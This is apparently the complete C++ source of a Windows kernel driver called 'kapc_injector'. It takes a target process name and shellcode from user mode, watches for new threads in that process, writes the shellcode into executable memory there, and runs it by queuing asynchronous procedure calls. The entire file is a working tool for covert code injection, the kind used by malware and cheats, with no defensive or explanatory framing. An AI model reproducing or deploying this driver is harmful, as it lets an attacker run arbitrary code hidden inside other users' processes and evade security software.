 
#include "common.h"
static UNICODE_STRING device_name = RTL_CONSTANT_STRING(L"\\Device\\kapc_injector");
static UNICODE_STRING symbolic_link = RTL_CONSTANT_STRING(L"\\DosDevices\\kapc_injector");
#define KAPC_INJECTOR_IOCTL CTL_CODE(FILE_DEVICE_UNKNOWN, 0x601, METHOD_NEITHER,FILE_READ_DATA | FILE_WRITE_DATA)



static auto thread_notify_routine(HANDLE ProcessId, HANDLE ThreadId, BOOLEAN Create) -> void;
auto  kernel_apc(PRKAPC Apc, PVOID* NormalRoutine, PVOID* NormalContext, PVOID* SystemArgument1, PVOID* SystemArgument2) -> void {


}
static auto kapc_function(PVOID NormalContext, PVOID SystemArgument1, PVOID SystemArgument2) -> void {
	PKAPC apc;

	apc = reinterpret_cast<PKAPC>(ExAllocatePool(NonPagedPool, sizeof(KAPC)));
	kinitialize_apc(apc,PsGetCurrentThread(), CurrentApcEnvironment, kernel_apc, NULL,kaddr , UserMode, NULL);
	
	if (kqueue_apc(apc, NULL, NULL, 0)) {
	
		PsRemoveCreateThreadNotifyRoutine(thread_notify_routine);
		k_result = kapc_injection_result_success;
	}
	else {
		ExFreePool(apc);
		k_result = kapc_user_queue_failed;

	}
	b_injected = true;
}

static auto kalloc(PEPROCESS ep,unsigned char *shell,SIZE_T size) -> PVOID {
	auto status = STATUS_SUCCESS;
	PVOID alloc = NULL;

	__try{
	
		SIZE_T alloc_size = size + 1;
		KAPC_STATE kapc_state;
		KeStackAttachProcess(ep, &kapc_state);
		status = ZwAllocateVirtualMemory(ZwCurrentProcess(), &alloc, 0, &alloc_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (!NT_SUCCESS(status)) {
			k_result = kapc_allocation_failed;
		}
		RtlCopyMemory(alloc, xapc_mem->shellcode, xapc_mem->shellcode_size);
		KeUnstackDetachProcess(&kapc_state);
		
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		if (k_result == kapc_allocation_failed)
			goto done;
		else k_result = kapc_failed_attach_process;
	}
	done:
	
	return alloc;

}
static auto check(HANDLE ThreadId,BOOLEAN Create) -> bool {
	auto thread = PETHREAD(nullptr);
		if (!Create)
			return false;
		if (NT_SUCCESS(PsLookupThreadByThreadId(ThreadId, &thread))) {
			if (PsIsSystemThread(thread)) {
				ObDereferenceObject(thread);
				return false;

			}
			else
				return true;
				
		}else
			return false;
		

}

static auto thread_notify_routine(HANDLE ProcessId, HANDLE ThreadId, BOOLEAN Create) -> void {
	auto e_thread = PETHREAD(nullptr);
	auto apc = PKAPC(nullptr);
	auto e_process = PEPROCESS(nullptr);
	PsLookupThreadByThreadId(ThreadId, &e_thread);
	e_process=IoThreadToProcess(e_thread);
	
	if (check(ThreadId, Create)) {
		if (strstr(reinterpret_cast<char*>((reinterpret_cast<unsigned char*>(e_process)+ offsets::imagefilename_offset)), xapc_mem->process_name)) {
			kaddr = kalloc(e_process, xapc_mem->shellcode, xapc_mem->shellcode_size);
			apc = reinterpret_cast<PKAPC>(ExAllocatePool(NonPagedPool, sizeof(KAPC)));
			kinitialize_apc(apc, e_thread, OriginalApcEnvironment, kapc_function, NULL, kernel_apc, KernelMode, NULL);
			if (!kqueue_apc(apc, NULL, NULL, 0))
				ExFreePool(apc);
		}
		else goto done;

	}
	else
		goto done;
	
	
	
	

done:
	if(e_thread)
		ObDereferenceObject(e_thread);
	
}

static auto inject() -> void {
	
	auto status = PsSetCreateThreadNotifyRoutine(thread_notify_routine);
	if (!NT_SUCCESS(status)) {
		k_result = kapc_create_thread_notify_failed;
	}
	else {
		while (b_injected != true) {


		}

	}
	

}


static auto major_control_function(PDEVICE_OBJECT DeviceObject, PIRP Irp) -> NTSTATUS {
	UNREFERENCED_PARAMETER(DeviceObject);

	auto result = STATUS_SUCCESS;
	auto IoStackLocation = PIO_STACK_LOCATION(nullptr);
	auto xpc_mem = pkapc_mem(nullptr);
	struct result xresult;
	
	
	IoStackLocation = IoGetCurrentIrpStackLocation(Irp);
	if (IoStackLocation->Parameters.DeviceIoControl.InputBufferLength < sizeof(kapc_mem)) {
		result = STATUS_BUFFER_TOO_SMALL;
		DbgPrint("invalid  data : %X\r\n", result);
	
	}
	/*xapc_mem*/xpc_mem = reinterpret_cast<pkapc_mem>(IoStackLocation->Parameters.DeviceIoControl.Type3InputBuffer);
	if (xpc_mem == NULL) {
		goto done;
	}
	if (IoStackLocation->Parameters.DeviceIoControl.IoControlCode == KAPC_INJECTOR_IOCTL) {
		
		xapc_mem = reinterpret_cast<pkapc_mem>(ExAllocatePool(NonPagedPool, sizeof(kapc_mem)));
		strcpy(xapc_mem->process_name, xpc_mem->process_name);
		xapc_mem->shellcode_size = xpc_mem->shellcode_size;
		xapc_mem->shellcode = reinterpret_cast<unsigned char*>(ExAllocatePool(NonPagedPool,xapc_mem->shellcode_size));
		RtlCopyMemory(xapc_mem->shellcode, xpc_mem->shellcode,xapc_mem->shellcode_size);
		inject();
		ExFreePool(xapc_mem->shellcode);
		xresult.k_result = k_result;
		
		RtlCopyMemory((PCHAR)Irp->UserBuffer, &xresult, sizeof(xresult));


	
	}
	
	else {
		result = STATUS_NOT_SUPPORTED;
		DbgPrint("invalid IOCTL code %X\r\n", result);
		goto done;
	}

done:
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return result;
	

}
static auto default_major_function(PDEVICE_OBJECT DeviceObject, PIRP Irp) -> NTSTATUS {
	UNREFERENCED_PARAMETER(DeviceObject);
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_NOT_SUPPORTED;
}
static auto unload(PDRIVER_OBJECT DriverObject) -> void {
	IoDeleteSymbolicLink(&symbolic_link);
	IoDeleteDevice(DriverObject->DeviceObject);
}
extern "C" auto DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) -> NTSTATUS {
	UNREFERENCED_PARAMETER(RegistryPath);
	
	DbgBreakPoint();
	static auto result = STATUS_SUCCESS;
	static auto device_object = PDEVICE_OBJECT(nullptr);
	kinitialize_apc = (KeInitializeApc*)common::api(api1);
	kqueue_apc = (KeInsertQueueApc*)common::api(api2);
	
	DriverObject->DriverUnload = unload;
	for (auto i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++) {
		DriverObject->MajorFunction[i] = default_major_function;
	}
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = major_control_function;
	result = IoCreateDevice(DriverObject, NULL, &device_name, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &device_object);
	if (!NT_SUCCESS(result)) {
		DbgPrint("failed to create device : %X\n", result);
		goto done;
	}
	result = IoCreateSymbolicLink(&symbolic_link, &device_name);
	if (!NT_SUCCESS(result)) {
		DbgPrint("failed to create symbolic link :%X\n", result);
		IoDeleteDevice(device_object);
		
	}
	


done:
	return result;

}